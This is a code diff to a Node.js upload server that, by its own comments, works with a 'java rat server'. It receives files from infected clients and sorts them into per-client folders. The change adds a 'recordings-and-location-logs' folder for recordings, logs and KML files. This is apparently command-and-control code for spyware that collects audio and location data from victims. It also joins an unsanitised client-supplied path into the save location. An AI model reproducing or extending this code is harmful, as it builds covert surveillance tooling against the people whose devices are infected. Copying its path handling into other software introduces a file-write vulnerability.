@@ -15,7 +15,7 @@ var fs     = require('fs');
 // The directory where each client dir is saved
 var controlServerDirectory = '/../';
 // The directory name inside the client dir
-var clientFileDirectoryName = 'media';
+var clientMediaDirectory = 'recordings-and-location-logs';
 // The max file size to accept from a client in bytes
 var maxFileSize = 10 * 1024 * 1024;
 
@@ -23,10 +23,9 @@ var storage = multer.diskStorage({
     destination: function(req, file, callback) {
         // For use with the java rat server we... located in the parent directory
         // Thus we use /../ and save in the client id's directory
-        var directory = path.join(__dirname, controlServerDirectory, req.params.clientId, clientFileDirectoryName);
         // Ensure dir exists, it probabaly already exists when using java rat server
-        mkdirp.sync(directory);
-        callback(null, directory);
+        mkdirp.sync(file.directory);
+        callback(null, file.directory);
     },
     filename: function(req, file, callback) {
         // Save the file with the name it had on the client side
@@ -42,17 +41,24 @@ var upload = multer({
     fileFilter: (req, file, callback) => {
         // Get file info from client
         var fileName = file.originalname;
-        // Get our working directory
-        var directory = path.join(__dirname, controlServerDirectory, req.params.clientId, clientFileDirectoryName);
+        // Get our working directory and set it to the file object for use in 'storage'
+        // If the path starts with data we are receiving a recording, log or kml file.
+        if(req.body.clientPath.split(path.sep)[1] === 'data'){
+            // Save it to the media folder
+            file.directory = path.join(__dirname, controlServerDirectory, req.params.clientId, clientMediaDirectory);
+        } else {
+            // Otherwise save the file in the original directory structure
+            file.directory = path.join(__dirname, controlServerDirectory, req.params.clientId, req.body.clientPath);
+        }
         // Check if the file already exists
-        fileExists(directory, fileName, (exists) => {
+        fileExists(file.directory , fileName, (exists) => {
             if(exists){
                 // File already exists, do not accept this upload
                 var error = req.params.clientId + ' ' + fileName + ' exists ';
                 callback(error, false);
             } else {
                 // File does not exist, accept it
-                console.log('%s Receiving: %s', req.params.clientId, fileName);
+                console.log('%s Saving: %s to %s', req.params.clientId, fileName, file.directory);
                 callback(null, true);
             }
         });
@@ -87,7 +93,8 @@ app.post('/postFile/:clientId', (req, res) => {
 app.get('/acceptFile/:clientId', (req, res) => {
     var fileName = req.query.fileName;
     var fileSize = req.query.fileSize;
-    var directory = path.join(__dirname, controlServerDirectory, req.query.clientId, clientFileDirectoryName);
+    var clientPath = req.query.clientPath;
+    var directory = path.join(__dirname, controlServerDirectory, req.query.clientId, clientPath);
     fileExists(directory, fileName, (exists) => {
         if(exists){
             res.status(500).send(fileName + ' Already exists on server');
